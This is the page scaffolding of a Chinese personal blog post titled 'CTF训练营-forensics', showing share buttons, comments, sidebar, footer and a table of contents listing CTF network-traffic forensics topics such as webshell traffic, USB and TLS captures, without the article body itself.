title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/96d6.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=CTF训练营-forensics&amp;url=https://hihopkc.github.io/posts/96d6.html&amp;pic=https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151644862.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401161032959.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/fd8.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401121522559.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【THM】Steel Mountain-Practice</div></div></a></div><div class="next-post pull-right"><a href="/posts/3d16.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151654852.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【THM】Alfred-Practice</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">网络流量分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">网络协议的基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">CTF流量分析的通用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP"><span class="toc-number">3.1.</span> <span class="toc-text">ICMP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98fetus-pcap-pcap"><span class="toc-number">3.1.1.</span> <span class="toc-text">例题fetus_pcap.pcap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet"><span class="toc-number">3.2.</span> <span class="toc-text">Telnet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98packet2-pcapng"><span class="toc-number">3.2.1.</span> <span class="toc-text">例题packet2.pcapng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04Networking"><span class="toc-number">3.2.2.</span> <span class="toc-text">04Networking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08Telnet%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="toc-number">3.2.3.</span> <span class="toc-text">08Telnet用户密码抓取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46telnet-cmd"><span class="toc-number">3.2.4.</span> <span class="toc-text">46telnet_cmd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP"><span class="toc-number">3.3.</span> <span class="toc-text">FTP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#09FTP"><span class="toc-number">3.3.1.</span> <span class="toc-text">09FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17WhyNotSftp"><span class="toc-number">3.3.2.</span> <span class="toc-text">17WhyNotSftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20leaks-suspected"><span class="toc-number">3.3.3.</span> <span class="toc-text">20leaks-suspected</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40ftp-data"><span class="toc-number">3.3.4.</span> <span class="toc-text">40ftp-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41ssPacket"><span class="toc-number">3.3.5.</span> <span class="toc-text">41ssPacket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#50fftp"><span class="toc-number">3.3.6.</span> <span class="toc-text">50fftp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS"><span class="toc-number">3.4.</span> <span class="toc-text">DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98DNS-pcap"><span class="toc-number">3.4.1.</span> <span class="toc-text">例题DNS.pcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05Dns"><span class="toc-number">3.4.2.</span> <span class="toc-text">05Dns</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Http-Https"><span class="toc-number">3.5.</span> <span class="toc-text">Http&#x2F;Https</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#02Http"><span class="toc-number">3.5.1.</span> <span class="toc-text">02Http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03Forensics-Four-Eyes"><span class="toc-number">3.5.2.</span> <span class="toc-text">03Forensics-Four Eyes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12tribalwars%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">3.5.3.</span> <span class="toc-text">12tribalwars账户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19Espionage"><span class="toc-number">3.5.4.</span> <span class="toc-text">19Espionage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23digital-camouflage"><span class="toc-number">3.5.5.</span> <span class="toc-text">23digital-camouflage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38HTTP%E5%A4%B4"><span class="toc-number">3.5.6.</span> <span class="toc-text">38HTTP头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48file-upload"><span class="toc-number">3.5.7.</span> <span class="toc-text">48file_upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B92%EF%BC%9A%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.6.</span> <span class="toc-text">考点2：菜刀、蚁剑流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%88%97%E7%9B%AE%E5%BD%95"><span class="toc-number">3.6.1.</span> <span class="toc-text">（1）列目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">3.6.2.</span> <span class="toc-text">（2）上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">3.6.3.</span> <span class="toc-text">（3）下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">3.6.4.</span> <span class="toc-text">（4）虚拟终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7"><span class="toc-number">3.6.5.</span> <span class="toc-text">（5）解题技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98packet3-pcapng"><span class="toc-number">3.6.6.</span> <span class="toc-text">例题packet3.pcapng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98yijian-pcapng"><span class="toc-number">3.6.7.</span> <span class="toc-text">例题yijian.pcapng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06%E8%8F%9C%E5%88%80"><span class="toc-number">3.6.8.</span> <span class="toc-text">06菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E8%8F%9C%E5%88%80%E5%AF%86%E6%96%87%E6%8A%93%E5%8F%96"><span class="toc-number">3.6.9.</span> <span class="toc-text">15菜刀密文抓取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34Webshell"><span class="toc-number">3.6.10.</span> <span class="toc-text">34Webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-3-%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.7.</span> <span class="toc-text">考点 3:冰蝎流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92%E9%98%B6%E6%AE%B5%E3%80%82"><span class="toc-number">3.7.1.</span> <span class="toc-text">1)密钥传递阶段。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AE%97%E6%B3%95%E5%8D%8F%E5%95%86%E9%98%B6%E6%AE%B5%E3%80%82"><span class="toc-number">3.7.2.</span> <span class="toc-text">2)算法协商阶段。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E9%98%B6%E6%AE%B5%E3%80%82"><span class="toc-number">3.7.3.</span> <span class="toc-text">3)加密通信阶段。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98bingxie-pcapng"><span class="toc-number">3.7.4.</span> <span class="toc-text">例题bingxie.pcapng</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#USB"><span class="toc-number">3.8.</span> <span class="toc-text">USB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98key-pcap"><span class="toc-number">3.8.1.</span> <span class="toc-text">例题key.pcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98mice-pcap"><span class="toc-number">3.8.2.</span> <span class="toc-text">例题mice.pcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11USB"><span class="toc-number">3.8.3.</span> <span class="toc-text">11USB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37usbcatch"><span class="toc-number">3.8.4.</span> <span class="toc-text">37usbcatch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLS"><span class="toc-number">3.9.</span> <span class="toc-text">TLS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98TheGreatEscape-pcapng"><span class="toc-number">3.9.1.</span> <span class="toc-text">例题TheGreatEscape.pcapng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98transcript-zip"><span class="toc-number">3.9.2.</span> <span class="toc-text">例题transcript.zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13SSL-Sniff"><span class="toc-number">3.9.3.</span> <span class="toc-text">13SSL Sniff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24greatescape"><span class="toc-number">3.9.4.</span> <span class="toc-text">24greatescape</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35ssl-sniffer2"><span class="toc-number">3.9.5.</span> <span class="toc-text">35ssl-sniffer2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smpt"><span class="toc-number">3.10.</span> <span class="toc-text">Smpt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01Smtp"><span class="toc-number">3.10.1.</span> <span class="toc-text">01Smtp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42smtp-cotent"><span class="toc-number">3.10.2.</span> <span class="toc-text">42smtp_cotent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43smtp-attachment"><span class="toc-number">3.10.3.</span> <span class="toc-text">43smtp_attachment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44http-smtp"><span class="toc-number">3.10.4.</span> <span class="toc-text">44http_smtp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45ftp-smtp"><span class="toc-number">3.10.5.</span> <span class="toc-text">45ftp-smtp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">3.11.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#10510-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">3.11.1.</span> <span class="toc-text">10510-数据包分析-密码获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10514-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-transfer"><span class="toc-number">3.11.2.</span> <span class="toc-text">10514-数据包分析-transfer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10516-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-BigData"><span class="toc-number">3.11.3.</span> <span class="toc-text">10516-数据包分析-BigData</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10518-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-Intercepted-Post"><span class="toc-number">3.11.4.</span> <span class="toc-text">10518-数据包分析-Intercepted Post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10521-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-No-Big-Deal"><span class="toc-number">3.11.5.</span> <span class="toc-text">10521-数据包分析-No_Big_Deal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10522-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-easycap"><span class="toc-number">3.11.6.</span> <span class="toc-text">10522-数据包分析-easycap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10525-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-first-contact"><span class="toc-number">3.11.7.</span> <span class="toc-text">10525-数据包分析-first-contact</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26voip"><span class="toc-number">3.11.8.</span> <span class="toc-text">26voip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10527-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-in-recorded-conversation"><span class="toc-number">3.11.9.</span> <span class="toc-text">10527-数据包分析-in-recorded-conversation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10528-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-private"><span class="toc-number">3.11.10.</span> <span class="toc-text">10528-数据包分析-private</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10529-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-iSpy"><span class="toc-number">3.11.11.</span> <span class="toc-text">10529-数据包分析-iSpy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10530-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-WatchMeSurfTheInternet"><span class="toc-number">3.11.12.</span> <span class="toc-text">10530-数据包分析-WatchMeSurfTheInternet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10531-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-john-in-the-middle"><span class="toc-number">3.11.13.</span> <span class="toc-text">10531-数据包分析-john-in-the-middle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10532-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-lolteam"><span class="toc-number">3.11.14.</span> <span class="toc-text">10532-数据包分析-lolteam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10533-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-Crack-this"><span class="toc-number">3.11.15.</span> <span class="toc-text">10533-数据包分析-Crack_this</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10536-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-weirdshark"><span class="toc-number">3.11.16.</span> <span class="toc-text">10536-数据包分析-weirdshark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10539-%E6%95%B0%E6%8D%AE%E5%8C%85%E8%AF%B7%E6%B1%82-SecretFile"><span class="toc-number">3.11.17.</span> <span class="toc-text">10539-数据包请求-SecretFile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10547-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-SString"><span class="toc-number">3.11.18.</span> <span class="toc-text">10547-数据包分析-SString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10549-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90-nfs"><span class="toc-number">3.11.19.</span> <span class="toc-text">10549-数据包分析-nfs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-analysis"><span class="toc-number">3.11.20.</span> <span class="toc-text">取证分析-analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-babypcap"><span class="toc-number">3.11.21.</span> <span class="toc-text">取证分析-babypcap</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/d8c8.html" title="【THM】HackPark-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401161032959.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】HackPark-Practice"/></a><div class="content"><a class="title" href="/posts/d8c8.html" title="【THM】HackPark-Practice">【THM】HackPark-Practice</a><time datetime="2024-01-16T02:31:13.000Z" title="发表于 2024-01-16 10:31:13">2024-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3d16.html" title="【THM】Alfred-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151654852.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】Alfred-Practice"/></a><div class="content"><a class="title" href="/posts/3d16.html" title="【THM】Alfred-Practice">【THM】Alfred-Practice</a><time datetime="2024-01-15T08:49:47.000Z" title="发表于 2024-01-15 16:49:47">2024-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/96d6.html" title="CTF训练营-forensics"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151644862.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF训练营-forensics"/></a><div class="content"><a class="title" href="/posts/96d6.html" title="CTF训练营-forensics">CTF训练营-forensics</a><time datetime="2024-01-15T07:42:41.000Z" title="发表于 2024-01-15 15:42:41">2024-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fd8.html" title="【THM】Steel Mountain-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401121522559.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】Steel Mountain-Practice"/></a><div class="content"><a class="title" href="/posts/fd8.html" title="【THM】Steel Mountain-Practice">【THM】Steel Mountain-Practice</a><time datetime="2024-01-11T14:29:50.000Z" title="发表于 2024-01-11 22:29:50">2024-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d92d.html" title="【THM】Kenobi-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401072140132.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】Kenobi-Practice"/></a><div class="content"><a class="title" href="/posts/d92d.html" title="【THM】Kenobi-Practice">【THM】Kenobi-Practice</a><time datetime="2024-01-07T08:49:34.000Z" title="发表于 2024-01-07 16:49:34">2024-01-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2024 By <a class="footer-bar-link" href="/" title="hihopkc" target="_blank">hihopkc</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">111</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">32</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" 